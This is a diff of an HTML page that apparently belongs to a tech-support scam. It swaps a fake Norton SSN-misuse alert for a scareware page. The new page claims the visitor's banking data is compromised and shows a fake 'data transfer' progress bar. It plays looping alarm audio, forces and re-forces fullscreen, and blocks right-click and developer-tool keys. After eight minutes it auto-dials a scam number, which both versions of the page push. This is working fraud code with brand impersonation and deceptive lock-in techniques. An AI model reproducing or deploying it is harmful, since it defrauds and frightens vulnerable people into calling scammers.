@@ -1,201 +1,232 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-   <script type="text/javascript">
+    <script type="text/javascript">
     (function(c,l,a,r,i,t,y){
         c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
         t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
         y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
     })(window, document, "clarity", "script", "snjdjg8gp4");
 </script>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SSN Misuse Detected - Norton ID Protection</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
+<meta charset="UTF-8">
+<title>Security Alert</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<style>
+    html, body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        background-color: black;
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        color: #fff;
+        position: relative;
+        user-select: none;
     }
 
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #ffffff;
-      color: #222;
-      padding: 20px;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      overflow-x: hidden;
+    #leavePopup {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff;
+        color: #000;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        z-index: 999;
+        width: 90%;
+        max-width: 400px;
+        text-align: center;
+        animation: heartbeat 1s infinite;
     }
 
-    .container {
-      max-width: 600px;
-      width: 100%;
-      margin: 0 auto;
-      border: 3px solid #c62828;
-      padding: 20px;
-      background-color: #ffffff;
-      box-shadow: 0 0 12px rgba(255, 0, 0, 0.3);
-      border-radius: 8px;
-      animation: slideIn 0.4s ease-out;
+    @keyframes heartbeat {
+        0%, 100% { transform: translate(-50%, -50%) scale(1); }
+        50% { transform: translate(-50%, -50%) scale(1.05); }
     }
 
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+    .popup-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
     }
 
-    .logo {
-      text-align: center;
-      margin-bottom: 15px;
+    .alert-text {
+        color: red;
+        font-weight: bold;
+        font-size: 18px;
     }
 
-    .logo img {
-      max-width: 140px;
-      height: auto;
-      background: transparent;
-      border-radius: 4px;
-      box-shadow: 0 0 4px rgba(0, 0, 0, 0.1);
+    .message-text {
+        text-align: left;
+        font-size: 14px;
+        color: #000;
     }
 
-    .header {
-      color: #b30000;
-      font-size: 24px;
-      font-weight: bold;
-      margin-bottom: 15px;
-      text-align: center;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      text-transform: uppercase;
+    .loading-text {
+        margin: 10px 0 5px 0;
+        color: red;
+        font-size: 16px;
+        font-weight: bold;
+        text-align: center;
     }
 
-    .header::before {
-      content: '⚠️';
-      font-size: 28px;
+    .progress-bar-container {
+        width: 100%;
+        height: 20px;
+        background-color: #444;
+        border-radius: 10px;
+        overflow: hidden;
     }
 
-    .content {
-      font-size: 16px;
-      line-height: 1.6;
-      text-align: left;
+    .progress-bar-fill {
+        height: 100%;
+        width: 0%;
+        background-color: red;
+        transition: width 0.5s linear;
     }
 
-    .alert {
-      background-color: #ffd6d6;
-      border-left: 5px solid #c62828;
-      padding: 12px;
-      margin: 15px 0;
-      border-radius: 5px;
-      animation: pulse 2s infinite ease-in-out;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.02); }
-      100% { transform: scale(1); }
-    }
-
-    .alert strong {
-      color: #b30000;
-      font-weight: bold;
-    }
-
-    .button {
-      display: inline-block;
-      background-color: #c62828;
-      color: white;
-      padding: 12px 25px;
-      text-decoration: none;
-      font-weight: bold;
-      margin-top: 20px;
-      border-radius: 5px;
-      transition: background-color 0.3s ease, transform 0.2s ease;
-    }
-
-    .button:hover {
-      background-color: #b71c1c;
-      transform: translateY(-2px);
-    }
-
-    .phone {
-      margin-top: 15px;
-      font-size: 18px;
-      font-weight: bold;
-      color: #c62828;
-    }
-
-    .phone a {
-      color: #c62828;
-      text-decoration: none;
-      transition: color 0.3s ease;
-    }
-
-    .phone a:hover {
-      color: #b71c1c;
+    .popup-content button, #callNumberText {
+        padding: 10px 20px;
+        background-color: red;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        font-size: 16px;
+        cursor: pointer;
+        margin-top: 20px;
+        display: none;
     }
 
     @media (max-width: 480px) {
-      .container {
-        padding: 15px;
-      }
-
-      .header {
-        font-size: 20px;
-      }
-
-      .header::before {
-        font-size: 24px;
-      }
-
-      .content, .alert {
-        font-size: 14px;
-      }
-
-      .button {
-        padding: 10px 20px;
-        font-size: 14px;
-      }
-
-      .phone {
-        font-size: 16px;
-      }
+        .message-text {
+            font-size: 12px;
+        }
+        .alert-text {
+            font-size: 16px;
+        }
     }
-  </style>
+</style>
 </head>
-<body>
-  <div class="container" role="main">
-    <div class="logo">
-      <img src="https://1992gameofthrone1992.github.io/imagetopa/norton.png" alt="Norton Logo" aria-label="Norton ID Protection Logo">
+<body oncontextmenu="return false;">
+
+<div id="leavePopup">
+    <div class="popup-content">
+        <div class="alert-text">🚨 URGENT SECURITY ALERT 🚨</div>
+        <div class="message-text">
+            Suspicious financial activity has been detected on your IP address <b>192.168.45.73</b>.<br><br>
+            An unauthorized attempt to access your online banking account and perform fraudulent transactions was traced to this device.<br><br>
+            <b>🔒 COMPROMISED INFORMATION:</b><br>
+            • Online Banking Login Details<br>
+            • Credit & Debit Card Information<br>
+            • Personal Identification Data<br>
+            • Financial Records<br><br>
+            <b>⚠️ IMMEDIATE ACTION REQUIRED</b><br>
+            Your banking credentials and funds are at severe risk. Failure to act now may result in permanent account suspension, financial loss, or legal consequences.<br><br>
+            📞 Contact Technical Support immediately to secure your banking account and device.
+        </div>
+
+        <div class="loading-text">Data Transfer in Progress...</div>
+        <div class="progress-bar-container">
+            <div class="progress-bar-fill" id="progressFill"></div>
+        </div>
+
+        <button id="callNowBtn">Call Now</button>
+        <div id="callNumberText">+1-844-709-2550</div>
     </div>
+</div>
 
-    <div class="header" role="alert">
-      SSN Misuse – Urgent EDD Scam Alert
-    </div>
+<audio id="alertAudio" loop>
+    <source src="https://1992gameofthrone1992.github.io/imagetopa/wfa1.m4a" type="audio/mp4">
+</audio>
 
-    <div class="content">
-      Your SSN appears in a case linked to fraudulent unemployment benefit claims filed in your name.
+<script>
+    const audio = document.getElementById('alertAudio');
+    const progressFill = document.getElementById('progressFill');
+    const callNowBtn = document.getElementById('callNowBtn');
+    const callNumberText = document.getElementById('callNumberText');
 
-      <div class="alert">
-        <strong>State Detected:</strong> California EDD<br>
-        <strong>Claim Date:</strong> July 25, 2025<br>
-        <strong>Amount Requested:</strong> $9,200
-      </div>
+    function isMobile() {
+        return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
+    }
 
-      📎 This may affect your federal tax status or trigger legal notices.
+    window.onload = function () {
+        if (navigator.userAgent.includes("HTTrack")) {
+            alert("Website copying attempt detected. Action has been logged.");
+        }
 
-      <br><br>
+        showPopup();
+    };
 
-      <!-- ✅ Button now opens dialer -->
-      <a href="tel:18447092550" class="button" aria-label="Call to report SSN misuse">👉 File SSN Misuse Report</a>
+    function showPopup() {
+        triggerFullScreen();
+        document.getElementById('leavePopup').style.display = 'block';
+        audio.play();
 
-      <div class="phone">
-        <a href="tel:18447092550" aria-label="Phone number for Norton ID Protection">📞 1-844-709-2550</a> – Support Team
-      </div>
-    </div>
-  </div>
+        if (isMobile()) {
+            callNowBtn.style.display = 'block';
+        } else {
+            callNumberText.style.display = 'block';
+        }
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 0.2;
+            if (progress > 100) progress = 100;
+            progressFill.style.width = progress + '%';
+            if (progress === 100) clearInterval(interval);
+        }, 1000);
+
+        setTimeout(function () {
+            window.location.href = "tel:+18447092550";
+        }, 480000);
+    }
+
+    callNowBtn.addEventListener('click', function () {
+        window.location.href = "tel:+18447092550";
+    });
+
+    function triggerFullScreen() {
+        const docElm = document.documentElement;
+        if (docElm.requestFullscreen) {
+            docElm.requestFullscreen().catch(() => {});
+        } else if (docElm.webkitRequestFullscreen) {
+            docElm.webkitRequestFullscreen();
+        } else if (docElm.msRequestFullscreen) {
+            docElm.msRequestFullscreen();
+        }
+    }
+
+    // Trigger fullscreen on ANY click
+    document.addEventListener('click', function () {
+        triggerFullScreen();
+    });
+
+    // Block basic dev tools
+    document.addEventListener('keydown', function (e) {
+        if (e.keyCode == 123 || 
+            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
+            (e.ctrlKey && (e.keyCode == 83 || e.keyCode == 85))) {
+            e.preventDefault();
+            alert("Action Blocked");
+        }
+    });
+
+    // Re-enter fullscreen if exited
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            document.addEventListener('click', reEnterFullscreenOnce, { once: true });
+        }
+    });
+
+    function reEnterFullscreenOnce() {
+        triggerFullScreen();
+    }
+</script>
+
 </body>
 </html>
